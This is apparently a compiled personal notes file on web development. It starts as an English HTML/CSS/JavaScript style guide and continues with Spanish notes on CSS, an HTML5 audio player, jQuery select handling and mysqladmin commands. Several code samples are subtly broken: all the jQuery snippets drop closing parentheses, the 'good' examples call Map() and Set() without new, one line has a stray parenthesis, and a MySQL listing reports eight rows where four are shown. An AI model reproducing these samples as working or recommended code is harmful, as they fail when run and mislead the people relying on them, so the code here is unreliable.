Two HTTP requests is significantly slower than one, but the perception of speed is the most
important factor.

```html
<!-- bad -->
<!doctype html>
<meta charset=utf-8>
<script src=analytics.js></script>
<title>Hello, world.</title>
<p>...</p>

<!-- good -->
<!doctype html>
<meta charset=utf-8>
<title>Hello, world.</title>
<p>...</p>
<script src=analytics.js></script>
```

## CSS

### Semicolons

While the semicolon is technically a separator in CSS, always treat it as a terminator.

```css
/* bad */
div {
  color: red
}

/* good */
div {
  color: red;
}
```

### Box model

The box model should ideally be the same for the entire document. A global
`* { box-sizing: border-box; }` is fine, but don't change the default box model
on specific elements if you can avoid it.

```css
/* bad */
div {
  width: 100%;
  padding: 10px;
  box-sizing: border-box;
}

/* good */
div {
  padding: 10px;
}
```

### Flow

Don't change the default behavior of an element if you can avoid it. Keep elements in the
natural document flow as much as you can. For example, removing the white-space below an
image shouldn't make you change its default display:

```css
/* bad */
img {
  display: block;
}

/* good */
img {
  vertical-align: middle;
}
```

Similarly, don't take an element off the flow if you can avoid it.

```css
/* bad */
div {
  width: 100px;
  position: absolute;
  right: 0;
}

/* good */
div {
  width: 100px;
  margin-left: auto;
}
```

### Positioning

There are many ways to position elements in CSS but try to restrict yourself to the
properties/values below. By order of preference:

```
display: block;
display: flex;
position: relative;
position: sticky;
position: absolute;
position: fixed;
```

### Selectors

Minimize selectors tightly coupled to the DOM. Consider adding a class to the elements
you want to match when your selector exceeds 3 structural pseudo-classes, descendant or
sibling combinators.

```css
/* bad */
div:first-of-type :last-child > p ~ *

/* good */
div:first-of-type .info
```

Avoid overloading your selectors when you don't need to.

```css
/* bad */
img[src$=svg], ul > li:first-child {
  opacity: 0;
}

/* good */
[src$=svg], ul > :first-child {
  opacity: 0;
}
```

### Specificity

Don't make values and selectors hard to override. Minimize the use of `id`'s
and avoid `!important`.

```css
/* bad */
.bar {
  color: green !important;
}
.foo {
  color: red;
}

/* good */
.foo.bar {
  color: green;
}
.foo {
  color: red;
}
```

### Overriding

Overriding styles makes selectors and debugging harder. Avoid it when possible.

```css
/* bad */
li {
  visibility: hidden;
}
li:first-child {
  visibility: visible;
}

/* good */
li + li {
  visibility: hidden;
}
```

### Inheritance

Don't duplicate style declarations that can be inherited.

```css
/* bad */
div h1, div p {
  text-shadow: 0 1px 0 #fff;
}

/* good */
div {
  text-shadow: 0 1px 0 #fff;
}
```

### Brevity

Keep your code terse. Use shorthand properties and avoid using multiple properties when
it's not needed.

```css
/* bad */
div {
  transition: all 1s;
  top: 50%;
  margin-top: -10px;
  padding-top: 5px;
  padding-right: 10px;
  padding-bottom: 20px;
  padding-left: 10px;
}

/* good */
div {
  transition: 1s;
  top: calc(50% - 10px);
  padding: 5px 10px 20px;
}
```

### Language

Prefer English over math.

```css
/* bad */
:nth-child(2n + 1) {
  transform: rotate(360deg);
}

/* good */
:nth-child(odd) {
  transform: rotate(1turn);
}
```

### Vendor prefixes

Kill obsolete vendor prefixes aggressively. If you need to use them, insert them before the
standard property.

```css
/* bad */
div {
  transform: scale(2);
  -webkit-transform: scale(2);
  -moz-transform: scale(2);
  -ms-transform: scale(2);
  transition: 1s;
  -webkit-transition: 1s;
  -moz-transition: 1s;
  -ms-transition: 1s;
}

/* good */
div {
  -webkit-transform: scale(2);
  transform: scale(2);
  transition: 1s;
}
```

### Animations

Favor transitions over animations. Avoid animating other properties than
`opacity` and `transform`.

```css
/* bad */
div:hover {
  animation: move 1s forwards;
}
@keyframes move {
  100% {
    margin-left: 100px;
  }
}

/* good */
div:hover {
  transition: 1s;
  transform: translateX(100px);
}
```

### Units

Use unitless values when you can. Favor `rem` if you use relative units. Prefer seconds over
milliseconds.

```css
/* bad */
div {
  margin: 0px;
  font-size: .9em;
  line-height: 22px;
  transition: 500ms;
}

/* good */
div {
  margin: 0;
  font-size: .9rem;
  line-height: 1.5;
  transition: .5s;
}
```

### Colors

If you need transparency, use `rgba`. Otherwise, always use the hexadecimal format.

```css
/* bad */
div {
  color: hsl(103, 54%, 43%);
}

/* good */
div {
  color: #5a3;
}
```

### Drawing

Avoid HTTP requests when the resources are easily replicable with CSS.

```css
/* bad */
div::before {
  content: url(white-circle.svg);
}

/* good */
div::before {
  content: "";
  display: block;
  width: 20px;
  height: 20px;
  border-radius: 50%;
  background: #fff;
}
```

### Hacks

Don't use them.

```css
/* bad */
div {
  // position: relative;
  transform: translateZ(0);
}

/* good */
div {
  /* position: relative; */
  will-change: transform;
}
```

## JavaScript

### Performance

Favor readability, correctness and expressiveness over performance. JavaScript will basically never
be your performance bottleneck. Optimize things like image compression, network access and DOM
reflows instead. If you remember just one guideline from this document, choose this one.

```javascript
// bad (albeit way faster)
const arr = [1, 2, 3, 4];
const len = arr.length;
var i = -1;
var result = [];
while (++i < len) {
  var n = arr[i];
  if (n % 2 > 0) continue;
  result.push(n * n);
}

// good
const arr = [1, 2, 3, 4];
const isEven = n => n % 2 == 0;
const square = n => n * n;

const result = arr.filter(isEven).map(square);
```

### Statelessness

Try to keep your functions pure. All functions should ideally produce no side-effects, use no outside data and return new objects instead of mutating existing ones.

```javascript
// bad
const merge = (target, ...sources) => Object.assign(target, ...sources);
merge({ foo: "foo" }, { bar: "bar" }); // => { foo: "foo", bar: "bar" }

// good
const merge = (...sources) => Object.assign({}, ...sources);
merge({ foo: "foo" }, { bar: "bar" }); // => { foo: "foo", bar: "bar" }
```

### Natives

Rely on native methods as much as possible.

```javascript
// bad
const toArray = obj => [].slice.call(obj);

// good
const toArray = (() =>
  Array.from ? Array.from : obj => [].slice.call(obj)
)();
```

### Coercion

Embrace implicit coercion when it makes sense. Avoid it otherwise. Don't cargo-cult.

```javascript
// bad
if (x === undefined || x === null) { ... }

// good
if (x == undefined) { ... }
```

### Loops

Don't use loops as they force you to use mutable objects. Rely on `array.prototype` methods.

```javascript
// bad
const sum = arr => {
  var sum = 0;
  var i = -1;
  for (;arr[++i];) {
    sum += arr[i];
  }
  return sum;
};

sum([1, 2, 3]); // => 6

// good
const sum = arr =>
  arr.reduce((x, y) => x + y);

sum([1, 2, 3]); // => 6
```
If you can't, or if using `array.prototype` methods is arguably abusive, use recursion.

```javascript
// bad
const createDivs = howMany => {
  while (howMany--) {
    document.body.insertAdjacentHTML("beforeend", "<div></div>");
  }
};
createDivs(5);

// bad
const createDivs = howMany =>
  [...Array(howMany)].forEach(() =>
    document.body.insertAdjacentHTML("beforeend", "<div></div>")
  );
createDivs(5);

// good
const createDivs = howMany => {
  if (!howMany) return;
  document.body.insertAdjacentHTML("beforeend", "<div></div>");
  return createDivs(howMany - 1);
};
createDivs(5);
```

### Arguments

Forget about the `arguments` object. The rest parameter is always a better option because:

1. it's named, so it gives you a better idea of the arguments the function is expecting
2. it's a real array, which makes it easier to use.

```javascript
// bad
const sortNumbers = () =>
  Array.prototype.slice.call(arguments).sort();

// good
const sortNumbers = (...numbers) => numbers.sort();
```

### Apply

Forget about `apply()`. Use the spread operator instead.

```javascript
const greet = (first, last) => `Hi ${first} ${last}`;
const person = ["John", "Doe"];

// bad
greet.apply(null, person);

// good
greet(...person);
```

### Bind

Don't `bind()` when there's a more idiomatic approach.

```javascript
// bad
["foo", "bar"].forEach(func.bind(this));

// good
["foo", "bar"].forEach(func, this);
```
```javascript
// bad
const person = {
  first: "John",
  last: "Doe",
  greet() {
    const full = function() {
      return `${this.first} ${this.last}`;
    }.bind(this);
    return `Hello ${full()}`;
  }
}

// good
const person = {
  first: "John",
  last: "Doe",
  greet() {
    const full = () => `${this.first} ${this.last}`;
    return `Hello ${full()}`;
  }
}
```

### Higher-order functions

Avoid nesting functions when you don't have to.

```javascript
// bad
[1, 2, 3].map(num => String(num));

// good
[1, 2, 3].map(String);
```

### Composition

Avoid multiple nested function calls. Use composition instead.

```javascript
const plus1 = a => a + 1;
const mult2 = a => a * 2;

// bad
mult2(plus1(5)); // => 12

// good
const pipeline = (...funcs) => val => funcs.reduce((a, b) => b(a), val);
const addThenMult = pipeline(plus1, mult2);
addThenMult(5); // => 12
```

### Caching

Cache feature tests, large data structures and any expensive operation.

```javascript
// bad
const contains = (arr, value) =>
  Array.prototype.includes
    ? arr.includes(value)
    : arr.some(el => el === value);
contains(["foo", "bar"], "baz"); // => false

// good
const contains = (() =>
  Array.prototype.includes
    ? (arr, value) => arr.includes(value)
    : (arr, value) => arr.some(el => el === value)
)();
contains(["foo", "bar"], "baz"); // => false
```

### Variables

Favor `const` over `let` and `let` over `var`.

```javascript
// bad
var obj = {};
obj["foo" + "bar"] = "baz";

// good
const obj = {
  ["foo" + "bar"]: "baz"
};
```

### Conditions

Favor IIFE's and return statements over if, else if, else and switch statements.

```javascript
// bad
var grade;
if (result < 50)
  grade = "bad";
else if (result < 90)
  grade = "good";
else
  grade = "excellent";

// good
const grade = (() => {
  if (result < 50)
    return "bad";
  if (result < 90)
    return "good";
  return "excellent";
})();
```

### Object iteration

Avoid `for...in` when you can.

```javascript
const shared = { foo: "foo" };
const obj = Object.create(shared, {
  bar: {
    value: "bar",
    enumerable: true
  }
});

// bad
for (var prop in obj) {
  if (obj.hasOwnProperty(prop))
    console.log(prop);
}

// good
Object.keys(obj).forEach(prop => console.log(prop));
```

### Objects as Maps

While objects have legitimate use cases, maps are usually a better, more powerful choice. When in
doubt, use a `Map`.

```javascript
// bad
const me = {
  name: "Ben",
  age: 30
};
var meSize = Object.keys(me).length;
meSize; // => 2
me.country = "Belgium";
meSize++;
meSize; // => 3

// good
const me = Map();
me.set("name", "Ben");
me.set("age", 30);
me.size; // => 2
me.set("country", "Belgium");
me.size; // => 3
```

### Curry

Currying might have its place in other languages, but avoid it in JavaScript. It makes your code harder to read by introducing a foreign paradigm while the appropriate use cases are extremely unusual.

```javascript
// bad
const sum = a => b => a + b;
sum(5)(3); // => 8

// good
const sum = (a, b) => a + b;
sum(5, 3); // => 8
```

### Readability

Don't obfuscate the intent of your code by using seemingly smart tricks.

```javascript
// bad
foo || doSomething();

// good
if (!foo) doSomething();
```
```javascript
// bad
void function() { /* IIFE */ }();

// good
(function() { /* IIFE */ }());
```
```javascript
// bad
const n = ~~3.14;

// good
const n = Math.floor(3.14);
```

### Code reuse

Don't be afraid of creating lots of small, highly composable and reusable functions.

```javascript
// bad
arr[arr.length - 1];

// good
const first = arr => arr[0];
const last = arr => first(arr.slice(-1));
last(arr);
```
```javascript
// bad
const product = (a, b) => a * b;
const triple = n => n * 3;

// good
const product = (a, b) => a * b;
const triple = product.bind(null, 3);
```

### Dependencies

Minimize dependencies. Third-party is code you don't know. Don't load an entire library for just a couple of methods easily replicable:

```javascript
// bad
var _ = require("underscore");
_.compact(["foo", 0]));
_.unique(["foo", "foo"]);
_.union(["foo"], ["bar"], ["foo"]);

// good
const compact = arr => arr.filter(el => el);
const unique = arr => [...Set(arr)];
const union = (...arr) => unique([].concat(...arr));

compact(["foo", 0]);
unique(["foo", "foo"]);
union(["foo"], ["bar"], ["foo"]);
```



#### etiqueta <link> para utilizar un css en html ####

<link type="text/css" rel="stylesheet" href="stylesheet.css">

#### fuentes pre-cargadas en css html css ####

serif sans-serif cursive

#### quitar el subrrallado a los links en css ####

text-decoration: none

#### un selector de pseudoclase es una forma de acceder a los elementos de html que no son parte del arbol del documento. usando los pseudo-selectores podes controlar la apariencia de enlaces que han sido y que no han sido visitados; e incluso de aquellos sobre los que el usuario pasa el cursor pero en los que aun no ha hecho clic. la sintaxis de css para los pseudoselectores es: html css ####

selector:selector_de_pseudoclase {   <--! veanse los dos puntos ":" seguidos del selector-->
    propiedad: valor;
}

#### algunos selectores de pseudoclase utiles referido a los links dentro de nuestra pagina web para dar les un formato dependiendo de si el usuario ha visitado ese link anteriormente o para que cambien de forma cuando un usuario para el mouse sobre los enlaces de son html css ####

a:link: un enlace sin visitar

a:visited: un enlace que ha sido visitado

a:hover: un enlace sobre el que pasas el

#### otro selector de pseudoclase util es first-child. se usa para aplicar el estilo unicamente a los elementos que son los primeros hijos de sus padres. por ejemplo: html css ####

p:first-child {
    color: red;
}

#### hara que todos los parrafos que sean los primeros hijos de sus padres tengan color rojo html css ####

#### muy bien! en realidad podes seleccionar cualquier hijo de un elemento despues del primer hijo, con el selector de pseudoclase nth-child; simplemente tenes que agregar el numero de hijo entre parentesis despues del selector de pseudoclase. por ejemplo html css ####

p:nth-child(2) {
    color: red;
}

#### pondra en color rojo a todos los parrafos que sean los segundos hijos de su elemento padre html css ####

#### para llegar a los selectores que estan anidados dentro de otros? si tenes un parrafo dentro de un div que esta dentro de otro div, podes alcanzarlo de esta forma: html css ####

div div p {
    propiedad: valor
}

#### esto le dara estilo a todos los parrafos anidados dentro de dos div y dejara intactos todos los parrafos que no cumplen con esos criterios html css ####

#### utilizando clases (class) podemos darle un mismo formato a diferentes etiquetas (selectorers) asi: html css ####

<!doctype html>
<html>
	<head>
		<link type="text/css" rel="stylesheet" href="stylesheet.css"/>
		<title>clases</title>
	</head>
	<body>
		<h3 class="elegante">este es mi encabezado ht -.-</h3>
		<p class="elegante">me gusta codecademy</p>
	</body>
</html>

#### del lado de css ####

.elegante {
    font-family: cursive;
    color: violet;
}

#### los elementos estan ubicados dentro de la pagina en lo que se conoce como "modelo de caja de css". cada elemento de html es como una pequena caja o contenedor que encierra las imagenes y el texto que especifiques ####

#### propiedad "display" y 4 valores html css ####

block (bloque): esto convierte al elemento en una caja de bloque. ?no permite que se coloque nada a su lado en la pagina! ocupa todo el ancho

inline-block (bloque en linea): esto convierte al elemento en una caja de bloque, pero permite que otros elementos se coloquen al lado en la misma linea

inline (en linea): esto hace que un elemento se coloque en la misma linea que otro elemento, pero sin darle formato de bloque. solamente ocupa el ancho que requiere (no ocupa la linea completa)

none (ninguno): esto hace que el elemento y su contenido desaparezcan de la pagina por completo

#### por default los elemnteos de html tienen el valor block ####

#### cada caja se compone de capas. desde la mas externa a la mas interna ####

margin: (margen) es el espacio que esta alrededor del elemento. cuanto mas grande el margen, mas espacio hay entre nuestro elemento y los que lo rodean. podemos ajustar el margen para mover nuestros elementos de html para que esten mas cerca o mas lejos unos de otros

border: es el borde del elemento. es lo que estuvimos haciendo visible cada vez que establecimos la propiedad border

padding: (relleno) es el espacio entre el contenido y el borde. con css, podemos ajustar este valor para mover el borde mas cerca o mas lejos del contenido

content: es el contenido que esta dentro de la caja. si estamos hablando de un elemento , el contenido es el texto del parrafo

en el diagrama vas a ver abreviaturas como tm, tb, y tp. estas quieren decir "top margin" (margen superior), "top border" (borde superior), y "top padding" (relleno superior). como veremos, podemos ajustar los rellenos, bordes y margenes superiores, derechos, izquierdos e inferiores en forma individual

#### posicionamiento absoluto posicionamiento ####

el primer tipo de posicionamiento es el posicionamiento absoluto. cuando se establece un elemento con position: absolute, se posiciona en relacion con el primer elemento padre que tenga y que no este establecido con position:static. si no existe tal elemento, el elemento con position: absolute se posiciona en relacion con <html>

#### z-index como una medida de importancia: cuanto mas alto sea el z-index de un elemento, mas "alto" se vera el elemento en la pagina. si le das un z-index de 1 a tu encabezado, pero no le das ningun z-index a los demas elementos, te aseguras de que tu encabezado quede "encima" de los otros elementos y de que no los tape ####


#### audio

HTML5, la nueva version (aun experimental, pero soportada por la mayoria de los navegadores) del lenguaje HTML, anade tags como "audio" o "video", de esta forma, como antes se hacian presentaciones de imagenes mezclando Javascript y HTML, ahora se puede hacer un reproductor completo.

# Nota: al menos Firefox no soporta MP3, dado que esta patentado, la mejor alternativa (incluso mejor que MP3) es OGG, totalmente libre. #

# Nota[2]: ningun musico fue "pirateado" en el proceso de escritura de este post, podeis encontrar musica libre en sitios como Jamendo #

Ahora si, HTML5...

# La etiqueta que se usa es: #

<audio src="ruta/al/archivo" 
[<strong>controls</strong>="controls"] 
[<strong>autoplay</strong>="autoplay"] 
[<strong>preload</strong>="preload"]> 
<strong>Texto</strong> </audio >


(Lo que esta entre '[' y ']' es opcional)

El texto solo se muestra si no se soporta la etiqueta audio, seria algo asi como la etiqueta noscript

# El significado de los atributos es: #

src: ruta al archivo (como con la etiqueta img)
controls: se mostraran los controles: boton de reproducir, una barra de progreso..
autoplay: empezara a reproducirse tan pronto como pueda
preload: se empezara a cargar el audio cuando se carge la pagina (se ignora si se utiliza autoplay)


# Entonces, con un codigo minimo: #

<!DOCTYPE HTML>
<html>
<head>
<title>Reproductor HTML5</title>
</head>
<body>

<audio src="music/example.ogg" controls="controls" >

Tu navegador no soporta el uso de la etiqueta de audio
</audio>

</body>
</html>

Obtenemos un reproductor de audio en html5

 
No esta mal, eh? y eso usando solo HTML, el navegador hace todo el trabajo,anadiendo algo de Javascript se pueden hacer cosas como listas de reproduccion...


<!DOCTYPE HTML>
<html>
<head>
<title>Reproductor HTML5</title>
<script type="text/javascript"><!--

// Lista de archivos de musica
var music_list=new Array("goof","sandjorda","widibf","fuayfsilfm");

var now_playing=0;
var player,next_tag,tag;

function change_file(f,p){
p.setAttribute('src','music/'+f+'.ogg');

p.load();
}
function next(p,t,n){

change_file(music_list[now_playing],p);
p.play();
t.value=music_list[now_playing];

now_playing=(now_playing+1)%music_list.length;
n.value="-> "+music_list[now_playing];

}
-->
</script>
</head>
<body>
<br/>
<audio id="player" preload="preload" controls="controls" >

Tu navegador no soporta el uso de la etiqueta de audio
</audio ><br/>
<input type="text" readonly="true" id="this_tag" value="">

<input type="button" onclick="next(player,tag,next_tag)" id="next_tag" value="">
<script type="text/javascript"><!--

player= document.getElementById('player');
next_tag= document.getElementById('next_tag');

tag= document.getElementById('this_tag');
next(player,tag,next_tag);

-->
</script>
</body>
</html>


#############################################################################################################################################################################################

############################################################################################# css ###########################################################################################

#### css

#### css phpacademy

#### para crear un huevo en css podemos crear un "div" con un "alto" y "ancho" al que le damos un color y luego le damos forma con el atributo "border-radius" ####

# index.html

<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <title>Egg</title>
      <link rel="stylesheet" href="css/egg.css">
   </head>
   <body>
      <div class="egg"></div>
   </body>
</html>

# egg.css

.egg {
    width:120px;
    height:170px;
    background-color:tomato;
    border-radius:50% 50% 50% 50% / 50% 50% 50% 50%; <!-- debemos jugar con estos valores para lograr la forma que deseamos -->
}


#### para crear un corazon en css creamos dos rectangulos los rotamos con "transform:rotate(-45deg)" "-webkit-transform:rotate(-45deg)" y por ultimo le damos "border-radius"

# index.html

<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <title>Heart</title>
      <link rel="stylesheet" href="css/heart.css">
   </head>
   <body>
      <div class="heart"></div>
   </body>
</html>

# heart.css

.heart {
     position:relative;
     margin:20px;
     height:170px;
     width:200px;	
}

.heart:before,
.heart:after{
     position:absolute;
     content:"";
     width:100px;
     height:160px;
     top:5px;
     background:red;
     border-radius:50px 50px 0 0;
}

.heart:before{
     left:100px;
     
     -webkit-transform:rotate(-45deg);
     transform:rotate(-45deg);

     -webkit-transform-origin: 0 100%;
     transform-origin: 0 100%;
}

.heart:after{
     left:0;

     -webkit-transform:rotate(-45deg);
     transform:rotate(-45deg);

     -webkit-transform-origin: 100% 100%;
     transform-origin: 100% 100%;
}

#### crear imagenes con titulos y descripciones elegantes ####

# index.html

<!DOCTYPE html>
<html>
   <head>
      <title>Image descriptions</title>
      <link rel="stylesheet" type="text/css" href="css/images.css"
   </head>
   <body>
      <figure>
         <img src="images/image.png" alt="A picture with description">
         <figcaption>
            <h1>This is an image with description</h1>
            <p>This is the description of this image that i am making in order to learn how to write html webpages, do you like it?</p>
         </figcaption>
      </figure>
   </body>
</html>

# css.css

* {
   margin:0;
   padding:0;
}

figure{
    position:absolute;
    width:400px;
    height:300px;
    overflow:hidden;
}

figcaption{
    position:relative;
    top:-40px;
    background:rgba(0, 0, 0, 0.5);
    -webkit-transition:top 1s ease;
    -ms-transition:top 1s ease;
    -moz-transition:top 1s ease;
    -o-transition:top 1s ease;
}

figure:hover figcaption {
    top:-82px;

}

h1, p {
    color:#ffffff;
}

# Over bright images at :hover

html:root input[type="image"] {
  opacity: .95 !important;
  border-radius: 5px !important;
}

html:root input[type="image"]:hover {
  opacity: 1 !important;
  border-radius: 5px !important;
}


NOTA: EL ATRIBUTO "PADDING" Y "MARGIN" NOS DA UN MARGEN ENTRE LOS DEMAS ELEMENTOS, SU PRIMER VALOR ESTABLECE EL MARGEN INFERIOR Y SUPERIOR MIENTRAS QUE EL SEGUNDO VALOR NOS DA UN MARGEN DE IZQUIERDA A DERECHA, ESTOS ATRIBUTOS TAMBIEN SOPORTAN VALORES COMO "AUTO"

NOTA: ES ALTAMENTE ACONSEJABLE UTILIZAR UN ESTILO CSS PARA DISPOSITIVOS MOVILES POR DEFAULT, PARA LOS USUARIOS QUE SE CONECCTAN DESDE ESTE TIPO DE DISPOSITIVOS NO TENGAN QUE DESCARGAR/CARGAR TODOS LOS ASSETS QUE TENEMOS PARA LOS USUARIOS DESKTOPS, YA QUE LOS DISPOSITIVOS MOVILES POR LO GENERAL TIENEN UN ANCHO DE BANDA MUY LENTO O INCLUSIVE LIMITADO
#############################################################################################################################################################################################

########################################################################################## javascript #######################################################################################

#### javascript

#### crear un servicio del sistema apartir de un script en node.js javascript ####

pm2 start app.js




#############################################################################################################################################################################################

############################################################################################ jquery #########################################################################################

#### jquery

#### jquery es un framework cuyo uso se hace casi inevitable para todos aquellos que usamos de forma intensiva JavaScript. El manejo de las listas de elementos en un sitio web, con la etiqueta <select>, es algo basico en el manejo de datos presentados en formularios de cara a validar, gestionar, editar, insertar... es decir, hacer todo tipo de operaciones con los datos en el cliente, necesitamos de JavaScript pero su uso es tedioso. jQuery lo hace simple e inmediato. Veamos el caso concreto del manejo del <select>.

#### Veamos, tenemos el siguiente listado en un sitio, vemos el codigo directamente en HTML: ####


    <select id="miselect">
    <option value="1">Ubuntu</option>
    <option value="2">Fedora</option>
    <option value="3">Red Hat</option>
    <option value="4">Debian</option>
    </select>


#### Para cada elemento tenemos dos datos: ####

El texto que se muestra: suele ser algo visible para el humano, un nombre de distribucion en este caso

El valor: suele ser un identificador unico, en este caso es una referencia ficticia a una tabla de distribuciones


Comencemos a tratarlo

#### Seleccionar el elemento ####

#### La sintaxis de los selectores de jQuery esta basada en la de CSS. En este caso elegir el <select> dentro del DOM del documento seria como sigue: ####


    $("#miselect"


#### Obtener el valor del item seleccionado ####

Sobre el selector aplicamos la funcion val():


    var mivalor = $("#miselect".val()


#### Obtener el texto del item seleccionado ####

Analogo al anterior, pero no podemos directamente usar la funcion text(). En caso de usarla directamente tendriamos una cadena con todos los textos que aparecen en el <select>. Para asegurarnos que tenemos solo el texto del elemento seleccionado incluimos en el selector "option:selected".


    var mitexto = $("#miselect option:selected".text()


#### Controlar el cambio de valor elegido ####

Tambien es importante controlar cuando cambia el valor elegido. Para manejar este evento usamos el siguiente codigo:


    $("#miselect".change(function() {
    alert("Han cambiado mi valor";
    });



#### Elegir un valor desde el codigo ####

En este caso usaremos la funcion val() pero en lugar de usarla sin parametros, le pasaremos un entero, con esta sobrecarga se comporta tal como queremos. Elegimos el segundo valor para nuestro ejemplo:


    $("#miselect".val(2)


#### Anadir mas valores en el cliente ####

Usamos la funcion appendTo():


    $("<option value='5'>Scientific Linux</option>".appendTo("#miselect";


#### Modificar el contenido interno en el cliente ####

Si queremos un cambio mas radical, porque hayamos recibido una informacion de una peticion AJAX tenemos la funcion html():



    $("#miselect".html(nuevosdatos);



#############################################################################################################################################################################################

############################################################################################ mysql ##########################################################################################

#### mysql

#### Configurar el password de root ####

# Si hacemos una instalacion de MySQL, veremos que no reuqerira password para conectar, por tanto configuramos uno con el siguiente comando: #

mysqladmin -u root password PASSWORD_ELEGIDO


#### Cambiar el password de root ####

# Si necesitamos actualizar el password de root en MySQL, entonces ejecutamos el siguiente comando. Por ejemplo, decimos que el password antiguo es 123456 y lo queremos actualizar a xyz123. #

mysqladmin -u root -p123456 password 'xyz123'


#### Chequear que el servidor MySQL esta activo ####

# Para constatar esto, ejecutamos lo suiguiente. #

mysqladmin -u root -p ping

Enter password:
mysqld is alive


#### Chequear que version de MySQL se esta ejecutando ####

# El siguiente comando muestra la version de MySQL que estamos ejecutando. #

mysqladmin -u root -p version

Enter password:
mysqladmin  Ver 8.42 Distrib 5.5.28, for Linux on i686
Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Server version          5.5.28
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/lib/mysql/mysql.sock
Uptime:                 7 days 14 min 45 sec

Threads: 2  Questions: 36002  Slow queries: 0  Opens: 15  Flush tables: 1  Open tables: 8  Queries per second avg: 0.059


#### Como conocer el estado actual del servidor #####

# Ejecutando este comando, nos muestra el estado actual, uptime (tiempo encendido), threads (hilos de procesos), y queries (cantidad de consultas). #

mysqladmin -u root -ppassword status

Enter password:
Uptime: 606704  Threads: 2  Questions: 36003  Slow queries: 0  Opens: 15  Flush tables: 1  Open tables: 8  Queries per second avg: 0.059


#### Chequear el estado de las variables del servidor y sus valores ####

# Para chequear estos datos, ejecutamos lo siguiente. #

mysqladmin -u root -p extended-status

Enter password:

+------------------------------------------+-------------+
| Variable_name                            | Value       |
+------------------------------------------+-------------+
| Aborted_clients                          | 3           |
| Aborted_connects                         | 3           |
| Binlog_cache_disk_use                    | 0           |
| Binlog_cache_use                         | 0           |
| Binlog_stmt_cache_disk_use               | 0           |
| Binlog_stmt_cache_use                    | 0           |
| Bytes_received                           | 6400357     |
| Bytes_sent                               | 2610105     |
| Com_admin_commands                       | 3           |
| Com_assign_to_keycache                   | 0           |
| Com_alter_db                             | 0           |
| Com_alter_db_upgrade                     | 0           |
| Com_alter_event                          | 0           |
| Com_alter_function                       | 0           |
| Com_alter_procedure                      | 0           |
| Com_alter_server                         | 0           |
| Com_alter_table                          | 0           |
| Com_alter_tablespace                     | 0           |
+------------------------------------------+-------------+


#### Chequear el estado de todas las variables del servidor MySQL ####

# Para conocer todas las varialbes activas del servidor y sus valores, ejecutamos lo suiguiente. #

mysqladmin  -u root -p variables

Enter password:

+---------------------------------------------------+----------------------------------------------+
| Variable_name                                     | Value                                        |
+---------------------------------------------------+----------------------------------------------+
| auto_increment_increment                          | 1                                            |
| auto_increment_offset                             | 1                                            |
| autocommit                                        | ON                                           |
| automatic_sp_privileges                           | ON                                           |
| back_log                                          | 50                                           |
| basedir                                           | /usr                                         |
| big_tables                                        | OFF                                          |
| binlog_cache_size                                 | 32768                                        |
| binlog_direct_non_transactional_updates           | OFF                                          |
| binlog_format                                     | STATEMENT                                    |
| binlog_stmt_cache_size                            | 32768                                        |
| bulk_insert_buffer_size                           | 8388608                                      |
| character_set_client                              | latin1                                       |
| character_set_connection                          | latin1                                       |
| character_set_database                            | latin1                                       |
| character_set_filesystem                          | binary                                       |
| character_set_results                             | latin1                                       |
| character_set_server                              | latin1                                       |
| character_set_system                              | utf8                                         |
| character_sets_dir                              | /usr/share/mysql/charsets/              |
| collation_connection                              | latin1_swedish_ci                            |
+---------------------------------------------------+----------------------------------------------+


#### Ver todos los procesos que ejecuta el servidor MySQL ####

# El siguiente comando los muestra. #

mysqladmin -u root -p processlist

Enter password:
+-------+---------+-----------------+---------+---------+------+-------+------------------+
| Id    | User    | Host            | db      | Command | Time | State | Info             |
+-------+---------+-----------------+---------+---------+------+-------+------------------+
| 18001 | rsyslog | localhost:38307 | rsyslog | Sleep   | 5590 |       |                  |
| 18020 | root    | localhost       |         | Query   | 0    |       | show processlist |
+-------+---------+-----------------+---------+---------+------+-------+------------------+


#### Como crear una base de datos ####

# Para crear una base de datos nueva, ejecutamos: #

mysqladmin -u root -p create databasename

Enter password:

Mostrar las bases de datos creadas (show databases).
# mysql -u root -p

Enter password:
Welcome to the MySQL monitor.  Commands end with ; or g.
Your MySQL connection id is 18027
Server version: 5.5.28 MySQL Community Server (GPL) by Remi

Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or 'h' for help. Type 'c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| databasename       |
| mysql              |
| test               |
+--------------------+
8 rows in set (0.01 sec)

mysql>


#### Borrar una base de datos existente ####

# Ejecutando el siguiente comando podra ser borrada, antes preguntara confirmacion. #

mysqladmin -u root -p DROP databasename

Enter password:
Dropping the database is potentially a very bad thing to do.
Any data stored in the database will be destroyed.

Do you really want to DROP the 'databasename' database [y/N] y
Database "databasename" dropped

#### Recargar/Refrescar los privilegios MySQL ####

# Este comando recarga los privilegios, reabre logs entre otros. #

mysqladmin -u root -p reload;
mysqladmin -u root -p refresh


#### Apagar de forma segura el servidor MySQL ####

# Ejecutamos lo suiguiente: #

mysqladmin -u root -p shutdown

Enter password:

# Podemos tambien usar los suiguientes comandos. #

/etc/init.d/mysqld stop
/etc/init.d/mysqld start


#### Algunos comandos utiles para refrescar datos en MySQL ####

# flush-hosts: Refresca toda la informacion del cache que hostea MySQL. #

mysqladmin -u root -p flush-hosts

# flush-tables: Refresca todas las tablas. #

mysqladmin -u root -p flush-tables

# flush-threads: Refresca los hilos de ejecucion. #

mysqladmin -u root -p flush-threads

# flush-logs: Refresca todos los logs de informacion. #

mysqladmin -u root -p flush-logs

# flush-privileges: Recarga las tablas de privilegios (lo mismo que recargar). #

mysqladmin -u root -p flush-privileges

# flush-status: Limpia el stado de las variables. #

mysqladmin -u root -p flush-status


#### Matar un proceso cliente dormido ####

# Ejecutando lo siguiente. #

mysqladmin -u root -p processlist

Enter password:

+----+------+-----------+----+---------+------+-------+------------------+
| Id | User | Host      | db | Command | Time | State | Info             |
+----+------+-----------+----+---------+------+-------+------------------+
| 5  | root | localhost |    | Sleep   | 14   |       |                  |
